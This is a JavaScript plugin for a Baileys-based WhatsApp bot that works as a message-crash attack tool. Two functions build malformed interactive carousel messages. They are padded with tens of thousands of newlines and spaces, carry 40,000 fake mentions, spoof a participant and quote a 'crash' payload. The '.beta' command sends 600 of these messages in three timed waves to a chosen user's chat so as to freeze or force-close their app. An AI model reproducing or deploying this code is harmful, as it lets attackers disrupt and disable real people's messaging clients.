import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

// 🔁 Delay
const delay = ms => new Promise(res => setTimeout(res, ms));

// ✅ Función 1: ForceCloseNew1 (boruto)
async function ForceCloseNew1(kerz, jid) {
  const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [{
              header: {
                title: '⛧ boruto ~ bug delay x fc ⛧',
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4",
                  mimetype: "image/jpeg",
                  fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                  fileLength: "164089",
                  height: 1,
                  width: 1,
                  mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                  fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                  directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4",
                  mediaKeyTimestamp: "1749258106",
                  jpegThumbnail: "base64string==",
                  scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                  scanLengths: [5657, 38661, 12072, 27792]
                },
                hasMediaAttachment: true
              },
              body: { text: "⛧angkasa ~ bug delay x fc⛧" },
              footer: { text: "Carosuel.json" },
              nativeFlowMessage: { messageParamsJson: "\n".repeat(10000) }
            }]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "Xrl ~ Fuckerr", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});
  await kerz.relayMessage(jid, msg.message, { participant: { jid }, messageId: msg.key.id });
}

// ✅ Función 2: CursorpCrLX
async function CursorpCrLX(kerz, jid) {
  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "🌹𝐀͠𝐧᪳𝐠͡𝐤𝐚͜𝐬͠𝐚͢ ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡 " + " ".repeat(10000)
          },
          footer: { text: "" },
          carouselMessage: {
            cards: [{
              header: {
                title: "🌹 𝐀͠𝐧᪳𝐠͡𝐤𝐚͜𝐬͠𝐚͢ ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡",
                imageMessage: {
                  mimetype: "image/jpeg",
                  height: 1,
                  width: 1,
                  mediaKey: "AgAAAAAAAAAAAAAAAAAAAAA=",
                  fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                  fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                  mediaKeyTimestamp: "999999999",
                  fileLength: "999999",
                  directPath: "/v/t62.7118-24/11734305_enc.jpg?ccb=11-4",
                  jpegThumbnail: Buffer.from("00", "hex"),
                },
                hasMediaAttachment: true
              },
              body: { text: " ".repeat(5000) },
              footer: { text: "carousel.json" },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(99999)
              }
            }]
          },
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(9999)
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "@s.whatsapp.net",
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: { text: "Sent", format: "DEFAULT" },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: JSON.stringify({
                      crash: "{ xx.com }".repeat(9999)
                    }),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {});
  await kerz.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid }
  });
}

// ✅ Tanda configurable
async function enviarTanda(conn, jid, num, m, ciclo) {
  try {
    for (let i = 0; i < 20; i++) {
      if (ciclo === '2') {
        await CursorpCrLX(conn, jid); // Ataque 2
      } else {
        await ForceCloseNew1(conn, jid); // Ataque 1 y 3
      }
      await delay(1000);
    }
    await conn.sendMessage(m.chat, {
      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
    }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: `❌ Error en tanda ${num}:\n${e.message}`,
    }, { quoted: m });
  }
}

// ✅ Comando .beta final
let handler = async (m, { conn }) => {
  const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
  if (m.sender !== botNumber) {
    return conn.sendMessage(m.chat, { text: '❌ Solo el número donde está vinculado el bot puede ejecutar este comando.' }, { quoted: m });
  }

  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;

  // 🚀 Ataque 1
  conn.sendMessage(m.chat, { text: '🚀 Ataque 1 iniciado (0:00). Duración: 5 minutos.' }, { quoted: m });
  for (let round = 0; round < 10; round++) {
    setTimeout(() => enviarTanda(conn, jid, round + 1, m, '1'), round * 30000);
  }

  // ⏳ Ataque 2
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 2 iniciado (10:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => enviarTanda(conn, jid, round + 1, m, '2'), round * 30000);
    }
  }, 600000);

  // ⏳ Ataque 3
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 3 iniciado (20:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => enviarTanda(conn, jid, round + 1, m, '3'), round * 30000);
    }

    // ✅ Final
    setTimeout(() => {
      conn.sendMessage(m.chat, {
        text: '🎯 Ataque finalizado. 600 mensajes enviados en total.',
      }, { quoted: m });
    }, 300000);
  }, 1200000);
};

handler.command = /^beta$/i;
export default handler;